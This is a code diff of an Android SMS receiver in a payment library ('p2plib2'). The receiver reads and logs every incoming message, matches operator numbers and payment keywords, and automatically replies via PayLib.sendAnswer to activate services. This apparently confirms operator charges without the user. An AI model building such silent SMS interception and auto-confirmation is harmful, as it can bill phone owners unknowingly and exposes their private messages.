@@ -10,18 +10,23 @@ import android.telephony.SmsMessage;
 
 import com.p2plib2.Logger;
 import com.p2plib2.PayLib;
+import com.p2plib2.common.MapData;
+import com.p2plib2.operators.Operator;
+
+import java.util.HashSet;
 
 import static com.p2plib2.PayLib.feedback;
-import static com.p2plib2.PayLib.flagok;
-import static com.p2plib2.PayLib.operatorSMS;
-import static com.p2plib2.Simple.PayLib.oper;
+import static com.p2plib2.PayLib.serviceActivation;
 
 public class SmsMonitor extends BroadcastReceiver {
+    String regex = "[\\)\\-\\ ]";
 
-    /**Monitor all receiving sms and filter required for payment*/
+    /**
+     * Monitor all receiving sms and filter required for payment
+     */
     @Override
     public void onReceive(Context context, Intent intent) {
-        Logger.lg("New sms! " + intent.getAction() + " not null " + (intent != null));
+        Logger.lg("Receive new sms! Intent is not null " + (intent != null));
         if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
             String smsSender = "";
             String smsBody = "";
@@ -30,16 +35,13 @@ public class SmsMonitor extends BroadcastReceiver {
                 for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                     smsSender = smsMessage.getDisplayOriginatingAddress();
                     smsBody += smsMessage.getMessageBody();
-                    Logger.lg("FIRST");
                     status = smsMessage.getStatus();
                 }
             } else {
                 Bundle smsBundle = intent.getExtras();
                 if (smsBundle != null) {
-                    Logger.lg(smsBundle.keySet().toString());
                     Object[] pdus = (Object[]) smsBundle.get("pdus");
-                    if (pdus == null) {
-                        // Display some error to the user
+                    if (pdus == null) {// Display some error to the user
                         Logger.lg("SmsBundle had no pdus key");
                         return;
                     }
@@ -49,67 +51,50 @@ public class SmsMonitor extends BroadcastReceiver {
                         smsBody += messages[i].getMessageBody();
                     }
                     smsSender = messages[0].getOriginatingAddress();
-                    Logger.lg("Second");
                     status = messages[0].getStatus();
                 }
             }
-            if (smsSender != null && operatorSMS.smsNum != null ) {
-                Logger.lg("sender " + smsSender + " " + operatorSMS.smsNum + " "
-                        + operatorSMS.smsNum.contains(smsSender) + "  smsBody.contains(operatorSMS.target) " +
-                        smsBody.contains(operatorSMS.target)
-                        + "body  " + smsBody + " status " + status
-                );
-            } else if(smsSender != null && oper.smsNum!=null){
-                Logger.lg("sender " + smsSender + " " + oper.smsNum + " " + oper.smsNum.contains(smsSender)
-                        + "  smsBody.contains(operatorSMS.target) " + smsBody.contains(oper.target)
-                        + "body  " + smsBody + " status " + status + " " + oper.smsNum.contains(smsSender)
-                );
+            Operator operator = PayLib.getOperatorsAgent(PayLib.currentOperation);
+            if (operator != null) {
+                Logger.lg(operator.operatorName + " " + PayLib.currentMsg);
+                if (smsSender != null && operator.smsNum != null) {
+                    Logger.lg("Sender " + smsSender + " operators known sms-portals " + operator.smsNum
+                            + ". Is operator portals nums contains this sender " + operator.smsNum.contains(smsSender) + " or name " + smsSender.toUpperCase().equals(operator.operatorName)
+                            + "  smsBody contains target " + smsBody.replaceAll("[\\)\\-\\ ]", "").contains(operator.target)
+                            + " body  " + smsBody + " status " + status + " target "
+                            + operator.target + " " + checkContents(smsBody.toLowerCase(),
+                            MapData.paymentDenied.get(MapData.OperatorNames.ALL)) );
+                    if ((operator.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operator.operatorName)
+                            || smsBody.replaceAll(regex, "").contains(operator.target))
+                            && (!checkContents(smsBody, MapData.paymentDenied.get(MapData.OperatorNames.ALL))
+                    || checkContents(smsBody, MapData.codeRequest.get(MapData.OperatorNames.ALL)))) {
+                        serviceActivation = true;
+                        PayLib.getSMSResult(smsBody);
+                        PayLib.sendAnswer(smsBody, smsSender);
+                    } else if (checkContents(smsBody, MapData.paymentDenied.get(MapData.OperatorNames.ALL))) {
+                        feedback.callResult("Process " + operator.operationId +  "Code P2P-003: " + smsBody);
+                    }
+                } else {
+                    feedback.callResult("Process " + operator.operationId + " Code P2P-003:  + smsNum is null!");
+                }
             }
-            Logger.lg(" " + (operatorSMS.name)
-            + " " + (oper.name) + " " + oper.smsNum  + " " + oper.operationId);
-         if(oper!=null && oper.smsNum!=null && oper.operationId!=null && oper.name!=null){
-                Logger.lg(oper.smsNum + " oper.smsNum ");
-               if((oper.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(oper.name)
-                        || smsBody.replaceAll("[\\)\\-\\ ]", "").contains(oper.target))
-                       && !((smsBody.contains("не про") || smsBody.contains("отказ") || smsBody.contains("не осущ")|| smsBody.contains("не выполн")))){
-                    Logger.lg("For oper process");
-                    com.p2plib2.Simple.PayLib.flagok = true;
-                    com.p2plib2.Simple.PayLib.getSMSResult(smsBody);
-                    com.p2plib2.Simple.PayLib.sendAnswer(smsBody, smsSender);
-                } else if(/*smsSender==null && */(smsBody.contains("не про") || smsBody.contains("отказ") || smsBody.contains("не осущ")|| smsBody.contains("не выполн") )){
-                    feedback.callResult("Code P2P-003: " + smsBody);
-                    com.p2plib2.Simple.PayLib.codeFeedback("Code P2P-003: " + smsBody, oper.operationId);
-                } else if (oper.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(oper.name)
-                       || smsBody.replaceAll("[\\)\\-\\ ]", "").contains(oper.target)){
-                   flagok = true;
-                   com.p2plib2.Simple.PayLib.getSMSResult(smsBody);
-                   com.p2plib2.Simple.PayLib.sendAnswer(smsBody, smsSender);
-               }
-            } else if(operatorSMS!=null && operatorSMS.smsNum != null && com.p2plib2.Simple.PayLib.operationIds.isEmpty()){
-             Logger.lg("operSMS");
-             if (operatorSMS.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorSMS.name)
-                     || smsBody.replaceAll("[\\)\\-\\ ]", "").contains(operatorSMS.target)) {
-                 flagok = true;
-                 PayLib.getSMSResult(smsBody);
-                 PayLib.sendAnswer(smsBody, smsSender);
-             } else if (operatorSMS.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorSMS.name)) {
-                 feedback.callResult("Code P2P-003: " + smsBody);
-             } else if(smsSender==null && (smsBody.contains("не про") || smsBody.contains("отказ") || smsBody.contains("не осущ")|| smsBody.contains("не выполн") )){
-                 feedback.callResult("Code P2P-003: " + smsBody);
-                 com.p2plib2.Simple.PayLib.codeFeedback("Code P2P-003: " + smsBody, null);
-             }
-         }
         }
-//        else if (intent.getAction().equals(Telephony.Sms.Intents.SMS_DELIVER_ACTION)) {
-//            String smsSender = "";
-//            String smsBody = "";
-//            int status = 0;
-//            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
-//                smsSender = smsMessage.getDisplayOriginatingAddress();
-//                smsBody += smsMessage.getMessageBody();
-//                status = smsMessage.getStatus();
-//            }
-//            Logger.lg("smsSender " + smsSender + " smsBody " + smsBody + " status " + status);
-//        }
+    }
+
+    /**
+     * Check contains in
+     *
+     * @param body    onу ща the templates from
+     * @param strings
+     */
+    public static boolean checkContents(String body, HashSet<String> strings) {
+        boolean result = false;
+        for (String str : strings) {
+            if (body.contains(str)) {
+                result = true;
+                break;
+            }
+        }
+        return result;
     }
 }
